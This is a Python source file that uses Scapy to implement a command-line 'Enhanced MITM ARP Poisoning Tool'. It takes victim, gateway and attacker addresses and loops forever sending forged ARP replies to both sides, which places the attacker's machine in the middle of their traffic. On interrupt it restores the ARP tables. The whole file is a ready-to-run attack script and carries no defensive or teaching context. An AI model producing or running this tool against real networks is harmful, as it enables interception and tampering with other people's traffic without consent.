from scapy.all import *
import argparse
import time

def poison_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac, interface):
    try:
        victim_arp_response = ARP(op=2, psrc=gateway_ip, pdst=victim_ip, hwdst=victim_mac, hwsrc=attacker_mac)
        gateway_arp_response = ARP(op=2, psrc=victim_ip, pdst=gateway_ip, hwdst=gateway_mac, hwsrc=attacker_mac)
        send(victim_arp_response, iface=interface, verbose=False)
        print("ARP poison sent: [Victim IP: %s | Spoofed as Gateway IP: %s]" % (victim_ip, gateway_ip))
        send(gateway_arp_response, iface=interface, verbose=False)
        print("ARP poison sent: [Gateway IP: %s | Spoofed as Victim IP: %s]" % (gateway_ip, victim_ip))
    except Exception as e:
        print("Failed to send ARP poison: %s" % str(e))

def restore_network(victim_ip, victim_mac, gateway_ip, gateway_mac, interface):
    try:
        send(ARP(op=2, psrc=gateway_ip, pdst=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5, iface=interface, verbose=False)
        send(ARP(op=2, psrc=victim_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), count=5, iface=interface, verbose=False)
        print("ARP tables restored for [Victim IP: %s, Gateway IP: %s]" % (victim_ip, gateway_ip))
    except Exception as e:
        print("Failed to restore network: %s" % str(e))

def main():
    parser = argparse.ArgumentParser(description="Enhanced MITM ARP Poisoning Tool")
    parser.add_argument("--victim-ip", required=True, help="IP address of the victim's machine")
    parser.add_argument("--victim-mac", required=True, help="MAC address of the victim's machine")
    parser.add_argument("--gateway-ip", required=True, help="IP address of the gateway")
    parser.add_argument("--gateway-mac", required=True, help="MAC address of the gateway")
    parser.add_argument("--attacker-mac", required=True, help="MAC address of the attacker's machine")
    parser.add_argument("--interface", default="eth0", help="Network interface to use for sending ARP packets")
    
    args = parser.parse_args()

    try:
        while True:
            poison_arp(args.victim_ip, args.victim_mac, args.gateway_ip, args.gateway_mac, args.attacker_mac, args.interface)
            time.sleep(2)
    except KeyboardInterrupt:
        print("Stopping ARP poisoning and restoring network...")
        restore_network(args.victim_ip, args.victim_mac, args.gateway_ip, args.gateway_mac, args.interface)

if __name__ == "__main__":
    main()
